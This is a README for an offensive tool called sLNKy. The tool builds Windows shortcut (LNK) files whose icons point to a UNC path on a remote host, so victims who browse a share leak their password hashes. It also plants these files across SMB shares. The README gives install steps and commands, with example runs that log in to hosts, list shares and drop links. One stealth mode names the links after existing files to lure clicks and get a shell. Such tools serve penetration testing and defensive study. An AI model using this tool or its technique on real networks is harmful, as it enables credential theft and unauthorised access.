# What is sLNKy?

sLNKy is a utility that automates the process of generating and dropping malicious LNK files on SMB shares.

# Malicious LNK files?

One can programmatically configure a LNK file use an icon hosted on a network share identified by a UNC path. When a user browses the file share, the vicim computer tries to resolve the icon -- sending a password hash in the process. sLNKy automates the process of creating a LNK file with a UNC path and can then go about dropping the maliciouis LNK on SMB shares.

# Installation

## Windows

	You're on your own!

## Linux (Debian/Kali)

	# Clone the repo
	git clone http://172.30.2.5/archangel/sLNKy

	# Head off dependency issues with Nokogiri
	apt-get install zlib1g-dev

	# Install gem dependencies using bundler
	sudo bundle install

	# Update a typo in the Rex library (dcerpc/client.rb)
		# line 126 should read: self.smb.client.read_timeout = self.options['read_timeout']
		# You'll see multiple files. When running the locate command.
		# Start with /usr/lib/ruby/vendor_ruby/rex/proto/dcerpc/client.rb but results may vary
		# I have a pull request with Rapid7 to fix the issue

	locate dcerpc/client.rb | egrep "client.rb$"

# Usage

sLNKy has decent documentation built-in via the help interface extended by Thor. Call a help menu for available commands by ```ruby sLNKy.rb help [cmd]```. Here are a few examples:

Getting general help:

	archangel@aasana:sLNKy~> ruby sLNKy.rb 
	                 __    _   ____ __     
	           _____/ /   / | / / //_/_  __
	          / ___/ /   /  |/ / ,< / / / /
	         (__  ) /___/ /|  / /| / /_/ / 
	        /____/_____/_/ |_/_/_|_\__,  /  
	         /___________________________/ 

	        Automated LNK Generator/Dropper

	Commands:
	  sLNKy.rb clean -L, --logfile=LOGFILE                                                               
	  sLNKy.rb drop -l, --lnkname=LNKNAME -t, --targets=TARGETS -u, --icon-unc-path=ICON_UNC_PATH        
	  sLNKy.rb generate -O, --outfile=OUTFILE -i, --icon-unc-path=ICON_UNC_PATH                            sLNKy.rb help [COMMAND]                                                                            
	  sLNKy.rb stealth_drop -l, --fallback-lnkname=FALLBACK_LNKNAME -t, --targets=TARGETS -u

Getting help for the ```generate``` command:

	archangel@aasana:sLNKy~> ruby sLNKy.rb help generate
	                 __    _   ____ __     
	           _____/ /   / | / / //_/_  __
	          / ___/ /   /  |/ / ,< / / / /
	         (__  ) /___/ /|  / /| / /_/ / 
	        /____/_____/_/ |_/_/_|_\__,  /  
	         /___________________________/ 

	        Automated LNK Generator/Dropper

	Usage:
	  sLNKy.rb generate -O, --outfile=OUTFILE -i, --icon-unc-path=ICON_UNC_PATH

	Options:
	  -i, --icon-unc-path=ICON_UNC_PATH  
	  -O, --outfile=OUTFILE              
	                                     # Default: evil.lnk

	Generate a malicious LNK file. Updates icon path to user defined UNC path.

## Commands

sLNKy offers three modes of operation at the moment: Generate, Drop, and Stealth Drop (stealth_drop)

### Generate

	# get help for the generate command
	ruby sLNKy.rb help generate

#### Description

Generate a malicious LNK file with a user-defined UNC path.

### Drop

	# get help for the drop command
	ruby sLNKy.rb help generate

#### Description

Pass a list of target hosts, a name for the LNK file, an optional list of share names, and optional credentials to sLNKy and it will attempt to authenticate to each share and drop a LNK file using the specified name. It should handle failed authentication and write attempts gracefully.

### Stealth Drop (stealth_drop)

	# get help for the stealth_drop command
	ruby sLNKy.rb help stealth_drop

#### Description

This command introduces an element of social engineering. Technique performs the same as ```drop``` but sLNKy tries to sample files/directories present on the share and select one for the LNK file. This increases the likelihood of user actually clicking the shortcut. Point the shortcut to an exectuable file under control and, voila, shell. sLNKy doesn't update the path the LNK points to as of yet but it will in the near future.

# Examples

## Drop Example

### Contents of ```targets.txt```

	192.168.1.2
	192.168.1.3
	junk.hosts.stuff.com

### Execution

	archangel@aasana:sLNKy~> ruby sLNKy.rb drop -l testing -t targets.txt -u \\\\172.30.128.2\\test\\test.png
	                 __    _   ____ __     
	           _____/ /   / | / / //_/_  __
	          / ___/ /   /  |/ / ,< / / / /
	         (__  ) /___/ /|  / /| / /_/ / 
	        /____/_____/_/ |_/_/_|_\__,  /  
	         /___________________________/ 

	        Automated LNK Generator/Dropper

	[+] Target host: 192.168.1.2 [LOGIN SUCCESS]
	        [+] Enumerating browseable shares...done, 7 share(s) enumerated
	        [+] Dropping links on valid shares.
	                [+] Target share: iron-root [SHARE CONNECT FAILURE]
	                [!] STATUS_ACCESS_DENIED (Command=117 WordCount=0)

	                [+] Target share: store [SHARE CONNECT FAILURE]
	                [!] STATUS_ACCESS_DENIED (Command=117 WordCount=0)

	                [+] Target share: ctp [SHARE CONNECT FAILURE]
	                [!] STATUS_ACCESS_DENIED (Command=117 WordCount=0)

	                [+] Target share: archangel [SHARE CONNECT FAILURE]
	                [!] STATUS_ACCESS_DENIED (Command=117 WordCount=0)

	                [+] Target share: test [SHARE CONNECT SUCCESS]
	                [+] Dropping link file: testing.lnk [FAILURE]
	                [!] Drop Failed:  STATUS_ACCESS_DENIED (Command=45 WordCount=0)


	[+] Target host: 127.0.0.1 [CONNECTION FAILURE]
	        [+] Connection failed: The connection was refused by the remote host (127.0.0.1:139).
	[+] Target host: 192.168.1.3 [LOGIN SUCCESS]
	        [+] Enumerating browseable shares...done, 3 share(s) enumerated
	        [+] Dropping links on valid shares.
	                [+] Target share: media [SHARE CONNECT SUCCESS]
	                [+] Dropping link file: testing.lnk [SUCCESS]
	                [+] UNC Path to LNK: \\192.168.1.3\media\testing.lnk



	[+] Target host: junk.hosts.stuff.com [CONNECTION FAILURE]
	        [+] Connection failed: The connection timed out (junk.hosts.stuff.com:139).

## Stealth Drop Example

### Contents of ```targets.txt```

	192.168.1.3

### Execution

	archangel@aasana:sLNKy~> ruby sLNKy.rb stealth_drop -t targets.txt -l notanothertest.lnk -u \\\\172.30.128.2\\test\\test.png
	                 __    _   ____ __     
	           _____/ /   / | / / //_/_  __
	          / ___/ /   /  |/ / ,< / / / /
	         (__  ) /___/ /|  / /| / /_/ / 
	        /____/_____/_/ |_/_/_|_\__,  /  
	         /___________________________/ 

	        Automated LNK Generator/Dropper

	[+] Target host: 192.168.1.3 [LOGIN SUCCESS]
	        [+] Enumerating browseable shares...done, 3 share(s) enumerated
	        [+] Dropping links on valid shares.
	                [+] Target share: media [SHARE CONNECT SUCCESS]
	                [+] Dropping link file: pictures.lnk [SUCCESS]
	                [+] UNC Path to LNK: \\192.168.1.3\media\pictures.lnk


	Writing drop log to dropped_lnks.csv
	
## Clean Example

### Contents of ```dropped_lnks.csv```

### Execution

	archangel@aasana:sLNKy~> ruby sLNKy.rb clean -L dropped_lnks.csv
	                 __    _   ____ __     
	           _____/ /   / | / / //_/_  __
	          / ___/ /   /  |/ / ,< / / / /
	         (__  ) /___/ /|  / /| / /_/ / 
	        /____/_____/_/ |_/_/_|_\__,  /  
	         /___________________________/ 

	        Automated LNK Generator/Dropper

	[+] Cleaning LNK files!  
	        [+] Deleting LNK: \\192.168.1.3\media\testing.lnk
	[+] Done cleaning LNK files!

# Credits

Much help was afforded to the author while developing this utility. The following were key contributors in one way or another.

-	HDM and Metasploit for REX/SMB Share Enumeration Module
-	rootl00p for conjuring the name sLNKy